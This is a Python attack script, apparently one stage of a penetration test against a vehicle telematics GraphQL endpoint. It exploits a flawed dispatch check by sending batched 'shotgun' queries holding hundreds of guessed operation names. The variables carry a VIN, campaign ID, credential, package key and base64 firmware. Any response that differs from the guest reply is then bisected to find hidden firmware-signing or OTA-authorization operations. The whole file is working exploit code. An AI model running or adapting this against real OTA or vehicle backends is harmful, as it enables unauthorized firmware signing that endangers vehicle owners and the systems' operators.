#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage D2: shotgun with a very large variables key dictionary.

Mechanism deduced from 03_EVIDENCE/tsp/0211_graphql_dispatch_mechanism.txt:
  *  "variables":{"vin"}  (invalid JSON!) still dispatched vehicleDiagnostics
  *  "variables":{}                -> fallback
  *  "query":"" + vars.vin          -> fallback
  => the handler checks   strings.Contains(queryText, opName)  AND
                               strings.Contains(variablesRawText, "\"<key>\"")
      So the op NAME lives in the query and the op's key NAME lives in variables.

A shotgun query with N candidate names in `query` and M candidate keys in
`variables` therefore covers all N*M (name,key) pairs in one request.
"""
import base64, hashlib, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

STEMS = ["vehicle", "vehicles", "ota", "firmware", "fw", "vcu", "campaign", "campaigns",
         "update", "package", "image", "ecu", "software", "release", "artifact",
         "flash", "flashing", "boot", "bootloader", "authorization", "authorize",
         "signing", "signature", "sign", "digest", "attestation", "attest",
         "diagnostic", "diagnostics", "engineering", "fleet", "cloud", "rollback",
         "reference", "commit", "submission", "submit", "approval", "approve",
         "manifest", "payload", "bundle", "delivery", "provision", "provisioning",
         "vcuReference", "referenceFirmware", "updatePackage", "firmwareImage"]
VERBS = ["sign", "signature", "signing", "signingRequest", "signRequest", "signUpdate",
         "signFirmware", "signPackage", "signImage", "signatureRequest",
         "update", "updateSign", "authorize", "authorization", "authorizeUpdate",
         "commit", "approve", "submit", "verify", "issue", "grant", "request",
         "AuthorizeUpdate", "SigningRequest", "SignUpdate", "SignFirmware"]

NAMES = set(STEMS)
for s in STEMS:
    for v in VERBS:
        NAMES.add(s + v[0].upper() + v[1:])
NAMES |= set("""
sign signFirmware otaSign signUpdate vehicleUpdateSign firmwareSign vehicleSign
otaSignFirmware vehicleCampaign vehicleOta vehiclePackage vehicleVcu vehicleUpdate
vehicleSignature vehicleFirmwareSignature otaSignature updateSignature
vehicleUpdateSignature firmwareSignature vehicleOtaSignature vehicleVcuSignature
signVehicleUpdate signVehicleFirmware signOtaUpdate signVcuUpdate
vehicleUpdateAuthorization vehicleAuthorization vehicleOTAUpdate
otaUpdateAuthorization firmwareUpdateAuthorization campaignAuthorization
vehicleFirmwareUpdate vehicleSoftwareUpdate vehicleEcuUpdate
vcuReferenceSignature signVcuReference diagnosticTicket ticket tickets
firmwareTicket otaTicket updateTicket commitUpdate submitUpdate approveUpdate
provisioningRequest authorizationRequest signingRequest firmwareUpdatePackage
vcuUpdatePackage signedFirmware signedUpdate certifiedUpdate certifiedFirmware
""".split())
NAMES = sorted(n for n in NAMES if n)

# ---- a huge dictionary of plausible variables KEY names ----------------------
KEYWORDS = """
vin vehicle vehicleId vehicleVin targetVin currentVin parentVin
campaignId campaign campaignID campaignName targetCampaign campaignCode
rollback rollbackCounter rollbackCounterValue maxRollback rollbackPolicy
minRollback rollbackProtected rollbackState
firmware firmwareImage firmwareBase64 firmwareHex firmwareBlob firmwareData
vcuFirmware vcuReference referenceFirmware image payload data blob content
sha256 digest hash firmwareSha256 imageSha256 contentSha256 firmwareHash
size length firmwareSize imageSize vcuSize updateSize totalSize
address updateAddress vcuUpdateAddress imageAddress firmwareAddress loadAddress
offset magic header signature sig signedSignature signatureBase64 signatureHex
r s rs der compactSignature
packageKey key secret apiKey token credential credentials auth authKey authorization
publicKey publicKeyPem publicKeyHex curve alg algorithm hashAlg signatureAlgorithm
nonce iv salt seed requestId requestID nonceCounter epoch timestamp ts
vinList vehicles vins devices fleetId tenantId scope
slot slotId slot0 slot1 slot2 destination target ecu ecuId ecuName
version firmwareVersion packageVersion updateVersion generation
type kind format encoding encodingMode mode
request signingRequest authorizationRequest updateRequest commitRequest
input output result response error message status
dryRun force debug allowAdmin bypass authorize sign
vcuReferenceSize vcuRollback vcuUpdateAddress tboxSha256 tboxSize
""".split()

VARS = {}
for k in KEYWORDS:
    if k in ("vin", "vehicleId", "vehicleVin", "targetVin", "currentVin", "parentVin"):
        VARS[k] = VIN
    elif "campaign" in k:
        VARS[k] = CAMP
    elif "rollback" in k or k in ("size", "length", "firmwareSize", "imageSize", "vcuSize",
                                  "updateSize", "totalSize", "rollbackCounter"):
        VARS[k] = 2
    elif "sha" in k or "digest" in k or "hash" in k:
        VARS[k] = SHA
    elif "address" in k or k in ("offset",):
        VARS[k] = "0x08040000"
    elif "size" in k:
        VARS[k] = 1024
    elif "firmware" in k or k in ("image", "payload", "data", "blob", "content", "vcuReference",
                                   "referenceFirmware", "vcuFirmware", "firmwareImage",
                                   "firmwareBase64", "firmwareHex", "firmwareBlob", "firmwareData"):
        VARS[k] = B64
    elif "key" in k or "secret" in k or "credential" in k or "token" in k or k in ("auth",):
        VARS[k] = CRED
    elif "nonce" in k or "iv" in k or "salt" in k or "seed" in k:
        VARS[k] = "nGYWxAUXYNV3Jwe9"
    elif "signature" in k or k in ("sig", "signedSignature", "r", "s", "rs"):
        VARS[k] = SHA
    elif "curve" in k or k in ("alg", "algorithm", "hashAlg", "signatureAlgorithm", "format", "type"):
        VARS[k] = "ECDSA-P256"
    elif "publicKey" in k or "ca" in k or k in ("packageKey",):
        VARS[k] = PKG
    else:
        VARS[k] = VIN

VARS["firmware"] = B64
VARS["firmwareHex"] = FW.hex()
VARS["firmwareBase64"] = B64
VARS["firmwareSha256"] = SHA
VARS["vcuReference"] = B64
VARS["size"] = 1024
VARS["address"] = "0x08040000"
VARS["rollback"] = 2
VARS["campaignId"] = CAMP
VARS["vin"] = VIN
VARS["packageKey"] = PKG
VARS["firmwareCredential"] = CRED
VARS["sha256"] = SHA
VARS["vcuUpdateAddress"] = "0x08040000"
VARS["vcuReferenceSize"] = 1024
VARS["vcuRollback"] = 2

print(f"[*] {len(NAMES)} names, {len(VARS)} variables keys")


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=12)
    return r.status_code, r.text.strip()


def chunk(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def main():
    jobs = [("allkeys", VARS, ch) for ch in chunk(NAMES, 50)]
    print(f"[*] {len(jobs)} shotgun requests")

    def run(job):
        vname, v, ch = job
        q = " ".join(ch)
        st, txt = post(q, v)
        return {"chunk": ch, "status": st, "guest": txt == GUEST, "resp": txt[:1500]}

    with ThreadPoolExecutor(max_workers=10) as ex:
        res = list(ex.map(run, jobs))
    json.dump(res, open(os.path.join(EV, "D2_shotgun_allkeys.json"), "w"), indent=1)
    bad = [r for r in res if not r["guest"]]
    print(f"[*] non-guest chunks: {len(bad)}")
    for r in bad:
        print("  !", r["chunk"][:5], r["status"], r["resp"][:400])
    found = []
    for r in bad:
        cand = r["chunk"]
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            if post(" ".join(a), VARS)[1] != GUEST:
                cand = a
            else:
                cand = b
        st, txt = post(cand[0], VARS)
        found.append({"name": cand[0], "status": st, "resp": txt[:1500]})
        print(f"  >>> {cand[0]} -> {st} {txt[:400]}")
    json.dump(found, open(os.path.join(EV, "D2_shotgun_bisected.json"), "w"), indent=1)
    print("[*] done")


if __name__ == "__main__":
    main()
